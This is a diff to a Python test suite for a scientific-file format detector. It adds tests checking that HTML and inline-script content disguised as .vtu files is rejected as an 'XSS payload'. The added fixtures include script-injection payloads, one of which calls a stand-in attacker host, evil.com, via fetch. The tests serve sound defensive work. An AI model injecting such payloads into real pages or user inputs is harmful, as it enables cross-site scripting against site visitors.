@@ -104,6 +104,16 @@ def make_random_text() -> bytes:
     return b"This is just a plain text file with no FEA content.\nLine 2.\nLine 3.\n"
 
 
+def make_html_payload() -> bytes:
+    """Generate content resembling an HTML document."""
+    return b"<!doctype html>\n<html><body><script>alert(1)</script></body></html>"
+
+
+def make_script_payload() -> bytes:
+    """Generate content containing an inline script block."""
+    return b"<script>fetch('http://evil.com')</script>"
+
+
 # ===================================================================
 # 1. Positive tests: valid XML VTK/VTU detection
 # ===================================================================
@@ -275,7 +285,7 @@ class TestUnknownContentRejection:
 
     def test_html_file(self):
         result = detect_format(b"<html><body>Hello</body></html>", filename="page.html")
-        assert result.detected_format == DetectedFormat.UNSUPPORTED
+        assert result.detected_format == DetectedFormat.REJECTED
 
     def test_no_filename_no_signature(self):
         result = detect_format(make_random_binary())
@@ -326,6 +336,18 @@ class TestExecutableRejection:
     def test_script_with_vtk_extension(self):
         result = detect_format(make_shebang_script(), filename="trick.vtk")
         assert result.detected_format == DetectedFormat.REJECTED
+        
+    def test_html_xss_injection(self):
+        """HTML payloads cannot bypass VTU parsers."""
+        result = detect_format(make_html_payload(), filename="xss.vtu")
+        assert result.detected_format == DetectedFormat.REJECTED
+        assert "XSS payload" in result.rejection_reason
+        
+    def test_js_xss_injection(self):
+        """JS payloads cannot bypass VTU parsers."""
+        result = detect_format(make_script_payload(), filename="xss.vtu")
+        assert result.detected_format == DetectedFormat.REJECTED
+        assert "XSS payload" in result.rejection_reason
 
 
 # ===================================================================
